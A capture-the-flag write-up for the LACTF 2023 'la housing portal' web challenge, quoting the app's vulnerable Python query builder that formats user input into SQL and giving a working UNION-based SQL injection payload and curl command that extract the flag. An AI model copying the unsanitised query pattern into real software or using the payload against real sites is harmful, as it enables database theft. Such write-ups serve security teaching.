# LACTF 2023

## la housing portal

> **Portal Tips Double Dashes ("--")** Please do not use double dashes in any text boxes you complete or emails you send through the portal. The portal will generate an error when it encounters an attempt to insert double dashes into the database that stores information from the portal.
Also, apologies for the very basic styling. Our unpaid LA Housing(tm) RA who we voluntold to do the website that we gave FREE HOUSING for decided to quit - we've charged them a fee for leaving, but we are stuck with this website. Sorry about that.
> 
> Please note, we do not condone any actual attacking of websites without permission, even if they explicitly state on their website that their systems are vulnerable.
> 
> Author: burturt
> 
> [`serv.zip`](serv.zip)

Tags: _web_

## Solution
The description already gives it away, the given web-app is vulnerable to SQL-injection. The web app lets us search for matching roommates and the function that builds the sql query does no sanitazion at all (well to stick to the truth, there is a tiny bit of sanitazion happening beforehand..).

```python
def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r
```

Since the sqlite database is given, we can beforehand inspect where the flag can be found. This makes things a bit easier, but would not be exactly necessary.

```bash
sqlite> .tables
awake     flag      guests    neatness  sleep     users
sqlite> .schema flag
CREATE TABLE flag (
flag text
);
sqlite> .schema users
CREATE TABLE IF NOT EXISTS "users"
(
    id       integer not null
        constraint users_pk
            primary key autoincrement,
    name     TEXT,
    guests   TEXT,
    neatness text,
    sleep    TEXT    not null,
    awake    text
);
sqlite> select * from users union select 1,flag,3,4,5,6 from flag;
1|Finn Carson|No guests at all|Put things away as we use them|8-10pm|4-6am
1|lactf{fake_flag}|3|4|5|6
2|Aldo Young|No guests at all|Put things away as we use them|8-10pm|6-8pm
...
```

This looks like a [`SQL Injection using UNION`](https://www.sqlinjection.net/union/) would work. Also comments are not really needed here, just injecting `' union select 1,flag,3,4,5,6 from flag'` to the last parameter gives us the flag.

```bash
curl -X POST https://la-housing.chall.lac.tf/submit -d "name=&guests=na&neatness=na&sleep=na&awake=4-6am\' union select 1,flag,3,4,5,6 from flag'"
```

Flag `lactf{us3_s4n1t1z3d_1npu7!!!}`